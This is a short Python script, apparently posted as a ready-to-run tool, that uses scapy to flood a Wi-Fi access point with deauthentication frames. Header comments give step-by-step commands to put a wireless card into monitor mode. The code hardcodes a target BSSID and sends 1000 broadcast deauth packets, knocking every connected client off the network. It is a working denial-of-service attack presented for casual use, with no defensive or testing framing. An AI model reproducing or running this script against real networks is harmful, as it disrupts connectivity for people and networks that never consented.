# Deauth Attacking for your pleasure
#
# On your console (follow STRICTLY the order)
# $ service network-manager stop
# $ ifconfig wlan0 down
# $ iwconfig wlan0 mode monitor
# $ ifconfig wlan0 up
# $ python deauth_attack.py
# ... :)
#
# -*- coding: utf-8 -*-
from scapy.all import *

def make_deauth_pkt(bssid, target='ff:ff:ff:ff:ff:ff'):
    return RadioTap()/Dot11(type=0, subtype=12, addr1=target,
                              addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)


if __name__ == "__main__":
    bssid = 'c0:25:a2:f5:25:d2'
    packet = make_deauth_pkt(bssid)
    for i in range(1000):
        sendp(packet, verbose=0)
        print 'Attacking(' + bssid + '): Send the Deauthentication flame:)'
